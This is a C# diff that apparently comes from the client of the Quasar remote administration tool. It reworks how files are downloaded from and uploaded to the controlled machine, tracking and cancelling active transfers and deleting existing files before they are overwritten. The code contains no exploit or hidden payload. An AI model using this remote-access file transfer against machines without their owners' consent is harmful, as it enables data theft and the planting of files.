@@ -100,9 +100,10 @@ namespace Quasar.Client.Commands
                 {
                     using (var srcFile = new FileSplit(command.RemotePath, FileAccess.Read))
                     {
+                        ActiveTransfers[command.Id] = srcFile;
                         foreach (var chunk in srcFile)
                         {
-                            if (!client.Connected || CanceledFileTransfers.ContainsKey(command.Id))
+                            if (!client.Connected || !ActiveTransfers.ContainsKey(command.Id))
                                 break;
 
                             // blocking sending might not be required, needs further testing
@@ -118,22 +119,25 @@ namespace Quasar.Client.Commands
                 }
                 catch (Exception)
                 {
-                    CanceledFileTransfers.Add(command.Id, "error");
                     client.Send(new FileTransferCancel
                     {
                         Id = command.Id,
                         Reason = "Error reading file"
                     });
                 }
-                LimitThreads.Release();
+                finally
+                {
+                    RemoveFileTransfer(command.Id);
+                    LimitThreads.Release();
+                }
             }).Start();
         }
 
         public static void HandleDoDownloadFileCancel(FileTransferCancel command, Networking.Client client)
         {
-            if (!CanceledFileTransfers.ContainsKey(command.Id))
+            if (ActiveTransfers.ContainsKey(command.Id))
             {
-                CanceledFileTransfers.Add(command.Id, "canceled");
+                RemoveFileTransfer(command.Id);
                 client.Send(new FileTransferCancel
                 {
                     Id = command.Id,
@@ -146,20 +150,30 @@ namespace Quasar.Client.Commands
         {
             try
             {
-                if (CanceledFileTransfers.ContainsKey(command.Id))
+                if (command.Chunk.Offset == 0)
+                {
+                    if (File.Exists(command.FilePath))
+                    {
+                        NativeMethods.DeleteFile(command.FilePath); // delete existing file
+                    }
+
+                    ActiveTransfers[command.Id] = new FileSplit(command.FilePath, FileAccess.Write);
+                }
+
+                if (!ActiveTransfers.ContainsKey(command.Id))
                     return;
 
-                if (command.Chunk.Offset == 0 && File.Exists(command.FilePath))
-                    NativeMethods.DeleteFile(command.FilePath); // delete existing file
+                var destFile = ActiveTransfers[command.Id];
+                destFile.WriteChunk(command.Chunk);
 
-                using (var destFile = new FileSplit(command.FilePath, FileAccess.Write))
+                if (destFile.FileSize == command.FileSize)
                 {
-                    destFile.WriteChunk(command.Chunk);
+                    RemoveFileTransfer(command.Id);
                 }
             }
             catch (Exception)
             {
-                CanceledFileTransfers.Add(command.Id, "error");
+                RemoveFileTransfer(command.Id);
                 client.Send(new FileTransferCancel
                 {
                     Id = command.Id,
@@ -289,6 +303,15 @@ namespace Quasar.Client.Commands
             {
                 if (isError && !string.IsNullOrEmpty(message))
                     client.Send(new SetStatusFileManager { Message = message, SetLastDirectorySeen = false });
+            }
+        }
+
+        private static void RemoveFileTransfer(int id)
+        {
+            if (ActiveTransfers.ContainsKey(id))
+            {
+                ActiveTransfers[id].Dispose();
+                ActiveTransfers.TryRemove(id, out _);
             }
         }
     }
